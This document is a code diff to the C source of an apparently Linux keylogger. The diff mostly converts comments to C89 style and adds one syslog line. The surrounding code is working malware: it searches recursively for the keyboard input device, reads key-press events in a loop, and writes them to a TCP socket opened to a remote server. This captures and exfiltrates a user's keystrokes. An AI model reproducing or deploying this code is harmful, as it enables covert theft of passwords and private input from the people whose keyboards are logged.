@@ -36,18 +36,18 @@ void startKeylogger(int keyboard, int fd)
 
     syslog(LOG_INFO, "Keylogging started..");
 
-    while (!STOP_KEYLOGGER) // If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging
+    while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
     {
         to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
-        if (to_write < 0) // If read was interrupted by SIGTERM or another error occurred we stop keylogging
+        if (to_write < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
             goto end;
         else
         {
             size_t j = 0;
-            for (size_t i = 0; i < to_write / event_size; i++) // For each event read
+            for (size_t i = 0; i < to_write / event_size; i++) /* For each event read */
             {
-                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) // If a key has been pressed..
-                    kbd_events[j++] = kbd_events[i];                                    // Add the event to the beginning of the array
+                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
+                    kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
             }
             if (writeEventsIntoFile(fd, kbd_events, j * event_size) < 0)
                 goto end;
@@ -72,8 +72,8 @@ int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
     do
     {
         written = write(fd, events, to_write);
-        if (written < 0) // It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written
-            return -1;   // If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written
+        if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
+            return -1;   /* If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written */
         events += written;
         to_write -= written;
     } while (to_write > 0);
@@ -94,47 +94,48 @@ int findKeyboardDevice(char *dir_path)
         return -1;
     }
 
-    while ((file = readdir(dir)) != NULL) // We need to check every file of the directory
+    while ((file = readdir(dir)) != NULL) /* We need to check every file of the directory */
     {
 
-        if (!strcmp(file->d_name, ".") || !strcmp(file->d_name, "..")) // We skip . and .. directories
+        if (!strcmp(file->d_name, ".") || !strcmp(file->d_name, "..")) /* We skip . and .. directories */
             continue;
 
         file_path = malloc(strlen(file->d_name) + strlen(dir_path) + 1);
         strcpy(file_path, dir_path);
-        strcat(file_path, file->d_name); // Concatenating dir path to current file name
+        strcat(file_path, file->d_name); /* Concatenating dir path to current file name */
 
         struct stat file_info;
 
-        if (lstat(file_path, &file_info) < 0) // Getting current file info
+        if (lstat(file_path, &file_info) < 0) /* Getting current file info */
         {
             syslog(LOG_ERR, "Couldn't get %s info: %s", file_path, strerror(errno));
             continue;
         }
-        if (!S_ISDIR(file_info.st_mode)) // If current file is not a directory..
+        if (!S_ISDIR(file_info.st_mode)) /* If current file is not a directory.. */
         {
-            if (S_ISCHR(file_info.st_mode)) // .. if it is a character device ..
+            if (S_ISCHR(file_info.st_mode)) /* .. if it is a character device .. */
             {
                 int keyboard_fd;
-                if (isKeyboardDevice(file_path, &keyboard_fd)) // .. and it is a keyboard device, we return its file descriptor
+                if (isKeyboardDevice(file_path, &keyboard_fd)) /* .. and it is a keyboard device, we return its file descriptor */
                 {
+                    syslog(LOG_ERR, "Keyboard device driver found: %s", file_path);
                     free(file_path);
                     return keyboard_fd;
                 }
             }
         }
-        else // If file is a directory..
+        else /* If file is a directory.. */
         {
             char *path_with_slash = malloc(strlen(file_path) + 2);
             strncpy(path_with_slash, file_path, strlen(file_path));
-            path_with_slash[strlen(file_path)] = '/'; // Appending a slash to the path
+            path_with_slash[strlen(file_path)] = '/'; /* Appending a slash to the path */
             path_with_slash[strlen(file_path) + 1] = '\0';
-            int kbd_fd = findKeyboardDevice(path_with_slash); // .. recursive call over this directory to check for its files
+            int kbd_fd = findKeyboardDevice(path_with_slash); /* .. recursive call over this directory to check for its files */
             if (kbd_fd != -1)
             {
                 free(file_path);
                 free(path_with_slash);
-                return kbd_fd; // Propagate descriptor to previous calls
+                return kbd_fd; /* Propagate descriptor to previous calls */
             }
         }
     }
@@ -177,10 +178,10 @@ int openConnectionWithServer(char *ip, short port)
     struct hostent *host_info;
     struct sockaddr_in server;
 
-    if ((host_info = gethostbyname(ip)) == NULL) // Translating hostname into Ip address
+    if ((host_info = gethostbyname(ip)) == NULL) /* Translating hostname into Ip address */
         return -1;
 
-    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); // Opening Tcp socket
+    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); /* Opening Tcp socket */
     if (sock_fd < 0)
         return -1;
 
@@ -190,7 +191,7 @@ int openConnectionWithServer(char *ip, short port)
     server.sin_addr = *((struct in_addr *)host_info->h_addr);
     server.sin_port = htons(port);
 
-    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) // Connecting to server
+    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) /* Connecting to server */
         return -1;
 
     return sock_fd;
